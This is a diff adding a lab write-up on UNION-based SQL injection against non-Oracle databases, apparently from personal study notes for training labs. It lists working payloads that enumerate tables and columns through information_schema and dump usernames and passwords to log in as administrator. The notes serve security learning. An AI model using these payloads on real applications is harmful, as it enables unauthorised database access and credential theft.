@@ -195,3 +195,42 @@ Database returned: `8.0.42-0ubuntu0.20.04.1`
 ### Key Takeaway
 `@@version` works cross-database (MySQL + MSSQL), making it a fast way to
 fingerprint the backend without needing separate payloads per DB type.
+
+## Lab 7: SQL Injection — Listing Database Contents on Non-Oracle Databases
+
+**Category:** UNION-based SQL Injection (Database Enumeration)
+**Database:** Non-Oracle (MySQL/SQL Server/PostgreSQL — uses information_schema)
+**Objective:** Discover the credentials table/columns and log in as administrator.
+
+### Approach
+Multi-stage recon before extraction — table/column names weren't given
+upfront, unlike earlier labs.
+
+1. Confirmed 2 text-compatible columns:
+```sql
+   ' UNION SELECT 'abc','def'--
+```
+2. Listed all tables in the database:
+```sql
+   ' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
+3. Identified the credentials table (e.g. `users_abcdef`), then listed its
+   columns:
+```sql
+   ' UNION SELECT column_name, NULL FROM information_schema.columns
+   WHERE table_name='users_abcdef'--
+```
+4. Identified username/password columns, then extracted all credentials:
+```sql
+   ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+```
+
+### Result
+Retrieved administrator's password from the dumped table, logged in
+successfully.
+
+### Key Takeaway
+When table/column names are unknown, `information_schema.tables` and
+`information_schema.columns` let you enumerate the entire schema before
+extraction — this recon step is only needed on non-Oracle databases,
+since Oracle uses `all_tables` / `all_tab_columns` instead.
